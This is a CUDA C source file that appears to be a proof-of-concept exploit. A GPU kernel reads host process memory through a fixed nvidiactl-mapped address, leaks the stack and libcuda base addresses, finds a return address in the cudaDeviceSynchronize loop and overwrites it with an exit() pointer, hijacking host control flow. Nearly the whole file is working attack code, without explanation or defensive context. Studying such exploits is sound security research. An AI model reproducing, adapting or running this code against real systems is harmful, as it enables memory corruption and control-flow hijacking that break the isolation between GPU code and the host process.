#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>


#define OFFSET 3


__global__ void kernel()
{
    return;
}
__global__ void attack_kernel(size_t *p)
{
    size_t i = 0;
    char *scanner = (char *)p;
    int counter = 0;

    // Leak the base address of stack
    bool flag1 = false;
    bool flag2 = false;
    bool flag3 = false;

    size_t *heap_base;
    while(1) {
        if (flag3 && *(p - i) == 0x200000000) {
            heap_base = (size_t *)(p - i);
            break;
        }

        if (flag2 && *(p - i) == 0x300200000) flag3 = true;
        else flag2 = false;

        if (flag1 && *(p - i) == 0x10000000000) flag2 = true;
        else flag1 = false;

        if (*(p - i) ==  0x10004000000) flag1 = true;
        i++;
    }

    bool trimmer = true;
    for(i = 0; *(heap_base + i) != 0xffffffffff600000; ++i) {
        if (*(heap_base + i) == 0x200000000 &&
            *(heap_base + i + 1) == 0x300200000) {            
            trimmer = false;
        }
        if (trimmer) continue;
    }
    size_t *stack_base = (heap_base + i - OFFSET);
    size_t *stack_end = (heap_base + i - OFFSET - 1);
    printf("Stack base address:\t%p\n", (void*)*stack_base);

    // Leak the base address of libcuda
    i = 0;
    size_t *libcuda_base = NULL;
    while(1) {
        if (*(scanner - i) != 'l') {
            i++;
            continue;
        }
        if (*(scanner - i + 1) != 'i' ||
            *(scanner - i + 2) != 'b' ||
            *(scanner - i + 3) != 'c' ||
            *(scanner - i + 4) != 'u' ||
            *(scanner - i + 5) != 'd' ||
            *(scanner - i + 6) != 'a') {
                i++;
                continue;
        }
        if(counter == 0) {
            counter++;
            i++;
            continue;
        }
        
        libcuda_base = (size_t *)(scanner - i);
        libcuda_base = libcuda_base + 19;
        libcuda_base = (size_t *)*libcuda_base;
        printf("Libcuda base address:\t%p\n", (void*)*libcuda_base);
        
        break;
    }

    // Leak the address of return address used in cudaSynchronize loop
    // scan the heap for the address of the address of offset 0x25f701
    // from the libcuda base address, which works as a return address
    // to the loop in cudaSynchronize().

    size_t return_address = *libcuda_base + 0x25f701;
    printf("Retaddr to be scanned:\t%p\n", (void *)return_address); 

    // Scan the stack to find the return address (return_address)

    for(char *scan_addr = (char *)*stack_base - 8; scan_addr > (char *)*stack_end; scan_addr--) {
        if (*(scan_addr) == (char)(return_address >> 40))
            if (*(scan_addr - 1) == (char)((return_address >> 32) & 0xff))
                if (*(scan_addr - 2) == (char)((return_address >> 24) & 0xff))
                    if (*(scan_addr - 3) == (char)((return_address >> 16) & 0xff))
                        if (*(scan_addr - 4) == (char)((return_address >> 8) & 0xff))
                            if(*(scan_addr - 5) == (char)(return_address & 0xff)) {
                                printf("Found retaddr at:\t%p\n", (void *)scan_addr);
                                return_address = (size_t)scan_addr;
                            }
    }
    printf("Overwrite the return address with exit() function. \n");
    size_t *exit_got_entry = (size_t *)(*libcuda_base + 0x436c5d0);
    *(size_t *)return_address = *exit_got_entry;

}


int main()
{
    kernel<<<1, 1>>>();
    cudaDeviceSynchronize();

    // Pass the pointer of fixed address in nvidiactl 
    // nvidiactl base: 0x200400000 
    // offset: 0x7ce8
    unsigned char **pp = (unsigned char **) (0x200400000ULL + 0x7ce8);
    size_t *p   = (size_t*)*pp;
    attack_kernel<<<1, 1>>>(p);
    
    // Wait for the kernel to finish
    cudaDeviceSynchronize();

    // This code never executes, because return address has been overwritten
    // and the process terminates before cudaDeviceSynchronize() returns.

    printf("Successfully finished kernel execution.\n");
    return 0;
}
